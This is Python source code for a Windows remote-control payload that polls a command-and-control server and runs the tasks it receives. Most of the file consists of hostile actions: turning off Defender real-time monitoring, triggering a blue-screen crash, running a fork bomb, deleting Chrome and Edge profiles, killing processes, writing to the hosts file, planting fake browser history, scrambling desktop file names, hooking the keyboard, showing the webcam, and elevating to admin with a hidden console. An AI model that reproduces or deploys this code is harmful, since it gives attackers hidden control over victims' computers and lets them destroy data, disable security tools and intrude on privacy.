# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os, sys, socket, uuid, time, requests, threading, subprocess, random, string, tkinter as tk, shutil, io, sqlite3, json, ctypes
try:
    import pyautogui, winsound, webbrowser, psutil, cv2
    from PIL import Image, ImageTk
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    import winreg
    from urllib.request import urlopen
    from playsound import playsound
    import win32api, win32con, win32event, win32process, win32gui
    from win32com.client import GetObject
except ImportError:
    pass

# ==================================================================================================
# CONFIGURATION & GLOBALS
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003"; HEARTBEAT_INTERVAL = 5
STATE = { k: False for k in ["noise", "clicking", "typing", "caps_spam", "overlay", "usb_spam", "focus_steal", "cursor_change", "app_spam", "streamer_cam", "shortkey_lock", "self_dos", "screen_reader"] }
OVERLAY_WINDOW, CAM_WINDOW, GUI_ROOT, HOOK_THREAD = None, None, None, None
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# ==================================================================================================
# HELPER FUNCTIONS
# ==================================================================================================
def get_resource_path(filename):
    """Gets the absolute path to a resource placed next to the executable."""
    if getattr(sys, 'frozen', False):
        # Running in a PyInstaller bundle
        base_path = os.path.dirname(sys.executable)
    else:
        # Running as a normal script
        base_path = os.path.abspath(".")
    return os.path.join(base_path, filename)

# ==================================================================================================
# ACTION FUNCTIONS
# ==================================================================================================
def placeholder_function(feature_name="Unknown", **kwargs):
    show_popup(title="Not Implemented", message=f"The '{feature_name}' feature is not yet implemented.")

def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "yes_no": 0x04}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: user32.MessageBoxW(0, message, title, style), daemon=True).start()

def _keyboard_hook_proc(nCode, wParam, lParam):
    """Low-level keyboard hook to block keys."""
    if nCode >= 0:
        if lParam.contents.vkCode in [0x5B, 0x5C]: return 1
        if wParam == win32con.WM_KEYDOWN and (lParam.contents.flags & 0b10000) and lParam.contents.vkCode == win32con.VK_TAB: return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def _start_hooking():
    """Function to run in a separate thread to manage the hook."""
    hook_id = user32.SetWindowsHookExA(win32con.WH_KEYBOARD_LL, ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(_keyboard_hook_proc), win32api.GetModuleHandle(None), 0)
    STATE["hook_id"] = hook_id
    win32gui.PumpMessages()

def start_shortkey_lock():
    if not STATE["shortkey_lock"]:
        STATE["shortkey_lock"] = True
        global HOOK_THREAD
        HOOK_THREAD = threading.Thread(target=_start_hooking, daemon=True)
        HOOK_THREAD.start()

def stop_shortkey_lock():
    if STATE.get("hook_id"):
        user32.UnhookWindowsHookEx(STATE["hook_id"])
        STATE["shortkey_lock"] = False
        STATE["hook_id"] = None

def start_screen_reader():
    if not STATE["screen_reader"]:
        try:
            key_path = r'Software\Microsoft\Narrator\NoRoam'
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 1)
            subprocess.Popen("Narrator.exe")
            STATE["screen_reader"] = True
        except Exception: pass

def stop_screen_reader():
    if STATE["screen_reader"]:
        subprocess.run("taskkill /f /im Narrator.exe", creationflags=0x08000000, shell=True)
        STATE["screen_reader"] = False

def disable_defender():
    ps_command = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
    try:
        subprocess.run(ps_command, shell=True, creationflags=0x08000000)
        show_popup("Defender Update", "Real-time monitoring has been disabled.", "info")
    except Exception as e:
        show_popup("Defender Failed", f"Could not disable Defender. Requires admin rights and Tamper Protection off.\n\nError: {e}", "error")

def set_screen_orientation(orientation="0"):
    try:
        orientation = int(orientation)
        device = win32api.EnumDisplayDevices(None, 0)
        dm = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
        if (dm.DisplayOrientation + orientation) % 2 == 1:
            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        dm.DisplayOrientation = (dm.DisplayOrientation + orientation) % 4
        win32api.ChangeDisplaySettingsEx(device.DeviceName, dm)
    except Exception as e:
        show_popup(title="Error", message=f"Failed to set screen orientation: {e}", icon_style="error")

def set_taskbar_size(size="normal"):
    value = 1
    if size == "small": value = 0
    elif size == "large": value = 2
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "TaskbarSi", 0, winreg.REG_DWORD, value)
        subprocess.run("taskkill /f /im explorer.exe", creationflags=0x08000000, shell=True)
        subprocess.Popen("explorer.exe")
    except Exception as e: show_popup(title="Error", message=f"Failed to set taskbar size: {e}", icon_style="error")

def random_filenames():
    try:
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        for filename in os.listdir(desktop_path):
            if os.path.isfile(os.path.join(desktop_path, filename)):
                file_ext = os.path.splitext(filename)[1]
                new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + file_ext
                try: os.rename(os.path.join(desktop_path, filename), os.path.join(desktop_path, new_name))
                except OSError: pass
    except Exception as e: show_popup(title="Error", message=f"Failed to rename files: {e}", icon_style="error")

def history_injector(urls=""):
    url_list = [u.strip() for u in urls.split('\n') if u.strip()]
    if not url_list: return
    def get_browser_paths(browser_name, profile_dir_name, history_file):
        paths = []
        base_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), browser_name, "User Data")
        if not os.path.exists(base_path): return []
        for item in os.listdir(base_path):
            if item == profile_dir_name or item.startswith("Profile "):
                path = os.path.join(base_path, item, history_file)
                if os.path.exists(path): paths.append(path)
        return paths
    for browser_exe in ["chrome.exe", "msedge.exe", "firefox.exe"]:
        subprocess.run(f"taskkill /f /im {browser_exe}", shell=True, creationflags=0x08000000)
    time.sleep(2)
    for path in get_browser_paths("Google\\Chrome", "Default", "History") + get_browser_paths("Microsoft\\Edge", "Default", "History"):
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            for url in url_list:
                visit_time = (int(time.time()) - random.randint(3600, 86400*30)) * 1000000
                cursor.execute("INSERT OR IGNORE INTO urls (url, title, visit_count, typed_count, last_visit_time) VALUES (?, ?, ?, ?, ?)", 
                               (url, url.split('//')[-1].split('/')[0], 1, 1, visit_time))
                url_id = cursor.lastrowid
                cursor.execute("INSERT OR IGNORE INTO visits (url, visit_time, from_visit, transition) VALUES (?, ?, ?, ?)", 
                               (url_id, visit_time, 0, 805306368))
            conn.commit(); conn.close()
        except Exception: continue

def set_airplane_mode(state="on"):
    value = 0 if state == "on" else 1
    try:
        key_path = r'System\CurrentControlSet\Control\RadioManagement\SystemRadioState'
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_DWORD, value)
    except Exception as e: show_popup("Admin Rights Required", f"Could not toggle airplane mode. Requires admin privileges.\n\nError: {e}", "error")

def set_bluetooth(state="on"):
    ps_command = "Enable-NetAdapter" if state == "on" else "Disable-NetAdapter"
    full_cmd = f'powershell -Command "Get-NetAdapter | Where-Object {{($_.Name -like \\"*Bluetooth*\\")}} | {ps_command}"'
    subprocess.run(full_cmd, shell=True, creationflags=0x08000000)

def toggle_desktop_icons():
    try:
        SHCNE_ASSOCCHANGED = 0x08000000; SHCNF_FLUSH = 0x1000
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
        value_name = 'HideIcons'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
            try: current_value, _ = winreg.QueryValueEx(key, value_name)
            except FileNotFoundError: current_value = 0
            new_value = 1 if current_value == 0 else 0
            winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, new_value)
        user32.SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, None, None)
    except Exception as e: show_popup(title="Error", message=f"Failed to toggle desktop icons: {e}", icon_style="error")

def dns_poison(target_url, redirect_ip):
    if not target_url or not redirect_ip: return
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, "a") as f: f.write(f"\n{redirect_ip}\t{target_url}\n")
    except Exception as e: show_popup(title="DNS Poison Failed", message=f"Could not write to hosts file. Requires admin privileges.\n\nError: {e}", icon_style="error")

def _noise_loop(sound_type="random", path=None):
    while STATE["noise"]:
        try:
            if sound_type == "custom" and path and os.path.exists(path):
                playsound(path)
            elif sound_type == "knocking":
                # ### THIS IS THE FIX ###
                # Look for a local knocking.mp3 file next to the payload.
                knock_path = get_resource_path("knocking.mp3")
                if os.path.exists(knock_path):
                    playsound(knock_path)
                else: # Fallback to system sound if not found
                    winsound.PlaySound("SystemExit", winsound.SND_ALIAS)
                    time.sleep(2)
            elif sound_type == "ear_splitting":
                winsound.Beep(random.randint(8000, 15000), 500); time.sleep(0.05)
            else: # Default to random
                winsound.Beep(random.randint(300, 2000), 150); time.sleep(0.05)
        except Exception as e:
            print(f"Error in noise loop: {e}"); time.sleep(1)

def start_noise(sound_type="random", path=None):
    if not STATE["noise"]: STATE["noise"] = True; threading.Thread(target=_noise_loop, args=(sound_type, path), daemon=True).start()
def stop_noise(): STATE["noise"] = False

def set_volume(level=1.0):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume)); volume.SetMasterVolumeLevelScalar(float(level), None)
    except: pass

def _usb_spam_loop():
    while STATE["usb_spam"]:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
def start_usb_spam():
    if not STATE["usb_spam"]: STATE["usb_spam"] = True; threading.Thread(target=_usb_spam_loop, daemon=True).start()
def stop_usb_spam(): STATE["usb_spam"] = False

def _caps_lock_loop():
    while STATE["caps_spam"]:
        if user32.GetKeyState(0x14) == 0:
            user32.keybd_event(0x14, 0x45, 1, 0); user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)
def start_caps_lock():
    if not STATE["caps_spam"]: STATE["caps_spam"] = True; threading.Thread(target=_caps_lock_loop, daemon=True).start()
def stop_caps_lock(): STATE["caps_spam"] = False

def _create_overlay_window():
    global OVERLAY_WINDOW;
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes("-topmost", True)
    OVERLAY_WINDOW.overrideredirect(True)
    return OVERLAY_WINDOW

def start_overlay(overlay_type="color", alpha=0.5, color="black", path=None):
    if not STATE["overlay"]:
        STATE["overlay"] = True
        def _task():
            win = _create_overlay_window()
            win.attributes('-alpha', alpha)
            if overlay_type.lower() == "color":
                win.configure(bg=color)
            elif overlay_type.lower() == "fake_crack":
                # ### THIS IS THE FIX ###
                # Look for a local crack.png file next to the payload.
                try:
                    crack_path = get_resource_path("crack.png")
                    if not os.path.exists(crack_path):
                        show_popup("Error", "crack.png not found next to the executable.", "error")
                        stop_overlay()
                        return
                    image = Image.open(crack_path)
                    win.configure(bg="white"); win.attributes("-transparentcolor", "white")
                    img_tk = ImageTk.PhotoImage(image)
                    label = tk.Label(win, image=img_tk, bg='white'); label.image = img_tk; label.pack()
                except Exception as e:
                    print(f"Failed to load crack image: {e}"); stop_overlay()
            elif overlay_type.lower() == "custom_image" and path and os.path.exists(path):
                try:
                    image = Image.open(path); img_tk = ImageTk.PhotoImage(image)
                    label = tk.Label(win, image=img_tk); label.image = img_tk; label.pack(fill="both", expand=True)
                except Exception as e:
                    print(f"Failed to load custom image: {e}"); stop_overlay()
        GUI_ROOT.after(0, _task)
def stop_overlay():
    if STATE["overlay"]:
        STATE["overlay"] = False
        if OVERLAY_WINDOW: GUI_ROOT.after(0, OVERLAY_WINDOW.destroy)

def _random_clicking_loop():
    w, h = pyautogui.size()
    while STATE["clicking"]: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def start_random_clicking():
    if not STATE["clicking"]: STATE["clicking"] = True; threading.Thread(target=_random_clicking_loop, daemon=True).start()
def stop_random_clicking(): STATE["clicking"] = False

def _random_typing_loop():
    while STATE["typing"]:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def start_random_typing():
    if not STATE["typing"]: STATE["typing"] = True; threading.Thread(target=_random_typing_loop, daemon=True).start()
def stop_random_typing(): STATE["typing"] = False

def open_cd_tray():
    try: ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None); time.sleep(3); ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except: pass

def _app_spam_loop():
    apps = ['notepad', 'calc', 'cmd', 'mspaint', 'explorer']
    while STATE["app_spam"]:
        try: os.startfile(random.choice(apps))
        except: pass
        time.sleep(random.uniform(1, 4))
def start_app_spam():
    if not STATE["app_spam"]: STATE["app_spam"] = True; threading.Thread(target=_app_spam_loop, daemon=True).start()
def stop_app_spam(): STATE["app_spam"] = False

def fake_shutdown(message="Windows is updating..."):
    def _sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, creationflags=0x08000000)
        time.sleep(30); subprocess.run('shutdown /a', shell=True, creationflags=0x08000000)
        show_popup("Update Failed", "The update could not be installed.", "error")
    threading.Thread(target=_sequence, daemon=True).start()

def set_wallpaper(path):
    if os.path.exists(path): user32.SystemParametersInfoW(20, 0, path, 3)

def open_website(url="https://google.com"): webbrowser.open(url)

def set_wifi(state="on"):
    action = "Enable-NetAdapter" if state == "on" else "Disable-NetAdapter"
    ps_command = f'powershell -Command "Get-NetAdapter -InterfaceType Wi-Fi | {action}"'
    subprocess.run(ps_command, shell=True, creationflags=0x08000000)

def _focus_stealer_loop():
    p = subprocess.Popen(['notepad.exe'], creationflags=0x08000000)
    time.sleep(1); hwnd = user32.FindWindowW("Notepad", None)
    while STATE["focus_steal"]:
        try:
            if user32.GetForegroundWindow() != hwnd: user32.SetForegroundWindow(hwnd)
        except: pass
        time.sleep(3)
    p.terminate()
def start_focus_stealer():
    if not STATE["focus_steal"]: STATE["focus_steal"] = True; threading.Thread(target=_focus_stealer_loop, daemon=True).start()
def stop_focus_stealer(): STATE["focus_steal"] = False

def _cursor_changer_loop():
    cursors = [32512, 32513, 32514, 32515, 32516, 32640, 32642, 32643, 32644, 32645, 32646, 32648, 32649]
    original_cursor = user32.CopyIcon(user32.LoadCursorW(None, 32512))
    while STATE["cursor_change"]:
        hcursor = user32.LoadCursorW(None, random.choice(cursors))
        user32.SetSystemCursor(hcursor, 32512); time.sleep(2)
    user32.SetSystemCursor(original_cursor, 32512)
def start_cursor_changer():
    if not STATE["cursor_change"]: STATE["cursor_change"] = True; threading.Thread(target=_cursor_changer_loop, daemon=True).start()
def stop_cursor_changer(): STATE["cursor_change"] = False

def printer_spam(text_to_print="You've been hacked"):
    temp_file = os.path.join(os.environ["TEMP"], "print_job.txt")
    with open(temp_file, "w") as f: f.write(text_to_print)
    for _ in range(10): os.startfile(temp_file, "print"); time.sleep(0.5)

def _streamer_cam_loop():
    global CAM_WINDOW; cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return
    def _update():
        if not STATE["streamer_cam"]:
            if CAM_WINDOW: CAM_WINDOW.destroy(); CAM_WINDOW = None; cap.release()
            return
        ret, frame = cap.read()
        if ret:
            img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)); imgtk = ImageTk.PhotoImage(image=img)
            CAM_WINDOW.label.imgtk = imgtk; CAM_WINDOW.label.configure(image=imgtk)
        GUI_ROOT.after(100, _update)
    def _create():
        global CAM_WINDOW
        CAM_WINDOW = tk.Toplevel(GUI_ROOT); CAM_WINDOW.attributes("-topmost", True)
        w = GUI_ROOT.winfo_screenwidth(); CAM_WINDOW.geometry(f"320x240+{w - 340}+20"); CAM_WINDOW.overrideredirect(True)
        CAM_WINDOW.label = tk.Label(CAM_WINDOW); CAM_WINDOW.label.pack()
        _update()
    GUI_ROOT.after(0, _create)
def start_streamer_cam():
    if not STATE["streamer_cam"]: STATE["streamer_cam"] = True; threading.Thread(target=_streamer_cam_loop, daemon=True).start()
def stop_streamer_cam(): STATE["streamer_cam"] = False

def kill_tasks():
    critical = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and user in proc.info['username'] and proc.info['name'].lower() not in critical:
                psutil.Process(proc.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue

def bsod():
    nullptr = ctypes.pointer(ctypes.c_int()); ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))

def browser_eraser():
    for path in [os.path.join(os.environ["LOCALAPPDATA"], b) for b in [os.path.join("Google", "Chrome", "User Data"), os.path.join("Microsoft", "Edge", "User Data")]]:
        if os.path.exists(path): shutil.rmtree(path, ignore_errors=True)

def fork_bomb():
    while True: subprocess.Popen([sys.executable, sys.argv[0]], creationflags=0x08000000)

def set_system_time(year, month, day, hour, minute):
    class SYSTEMTIME(ctypes.Structure):
        _fields_ = [('wYear', ctypes.wintypes.WORD), ('wMonth', ctypes.wintypes.WORD), ('wDayOfWeek', ctypes.wintypes.WORD), ('wDay', ctypes.wintypes.WORD), ('wHour', ctypes.wintypes.WORD), ('wMinute', ctypes.wintypes.WORD), ('wSecond', ctypes.wintypes.WORD), ('wMilliseconds', ctypes.wintypes.WORD)]
    try:
        st = SYSTEMTIME(int(year), int(month), 0, int(day), int(hour), int(minute), 0, 0)
        kernel32.SetSystemTime(ctypes.byref(st))
    except Exception as e: show_popup(title="Admin Rights Required", message=f"Failed to set time. Requires admin privileges.\n\nError: {e}", icon_style="error")

def _self_dos_loop(power=5):
    power = int(power)
    while STATE["self_dos"]:
        _ = [i*i for i in range(power * 1000)]
        time.sleep(max(0.001, 0.05 / power))
def start_self_dos(power=5):
    if not STATE["self_dos"]:
        STATE["self_dos"] = True; threading.Thread(target=_self_dos_loop, args=(power,), daemon=True).start()
def stop_self_dos(): STATE["self_dos"] = False

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        ACTION_MAP = {
            "show_popup": show_popup, "start_noise": start_noise, "stop_noise": stop_noise, "set_volume": set_volume,
            "start_usb_spam": start_usb_spam, "stop_usb_spam": stop_usb_spam, "start_overlay": start_overlay, "stop_overlay": stop_overlay,
            "start_random_clicking": start_random_clicking, "stop_random_clicking": stop_random_clicking, "start_random_typing": start_random_typing,
            "stop_random_typing": stop_random_typing, "open_cd_tray": open_cd_tray, "start_app_spam": start_app_spam, "stop_app_spam": stop_app_spam,
            "fake_shutdown": fake_shutdown, "set_wallpaper": set_wallpaper, "start_caps_lock": start_caps_lock, "stop_caps_lock": stop_caps_lock,
            "open_website": open_website, "set_wifi": set_wifi, "set_screen_orientation": set_screen_orientation, "start_focus_stealer": start_focus_stealer,
            "stop_focus_stealer": stop_focus_stealer, "set_system_time": set_system_time, "start_cursor_changer": start_cursor_changer,
            "stop_cursor_changer": stop_cursor_changer, "printer_spam": printer_spam, "start_streamer_cam": start_streamer_cam,
            "stop_streamer_cam": stop_streamer_cam, "fork_bomb": fork_bomb, "kill_tasks": kill_tasks, "bsod": bsod,
            "browser_eraser": browser_eraser, "start_self_dos": start_self_dos, "stop_self_dos": stop_self_dos,
            "dns_poison": dns_poison, "toggle_hide_icons": toggle_desktop_icons, "set_airplane_mode": set_airplane_mode,
            "set_bluetooth": set_bluetooth, "history_injector": history_injector, "random_filenames": random_filenames,
            "set_taskbar_size": set_taskbar_size, "start_shortkey_lock": start_shortkey_lock, "stop_shortkey_lock": stop_shortkey_lock,
            "start_screen_reader": start_screen_reader, "stop_screen_reader": stop_screen_reader, "disable_defender": disable_defender,
            "user_change": lambda: placeholder_function("User Change", **args), "safe_boot": lambda: placeholder_function("Safe Boot"),
            "not_so_shortcut": lambda: placeholder_function("NotSoShortcut", **args), "taskbar_scramble": lambda: placeholder_function("Taskbar Scramble"), 
            "hijack_overclock": lambda: placeholder_function("Hijack Overclock"),
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")
            
def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data and "tasks" in data and data["tasks"]:
                    print(f"[*] Received {len(data['tasks'])} tasks from C2.")
                    process_tasks(data["tasks"])
        except requests.RequestException: pass
        except Exception as e: print(f"[!] FATAL ERROR in C2 loop: {e}")
        time.sleep(HEARTBEAT_INTERVAL)

def main():
    """Main logic of the payload."""
    if sys.executable.endswith("pythonw.exe"): pass
    elif sys.executable.endswith("python.exe") and 'idlelib' not in sys.modules:
        user32.FreeConsole()
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True); c2_thread.start()
    global GUI_ROOT
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw()
    GUI_ROOT.mainloop()

if __name__ == "__main__":
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        main()
    except Exception:
        sys.exit(1)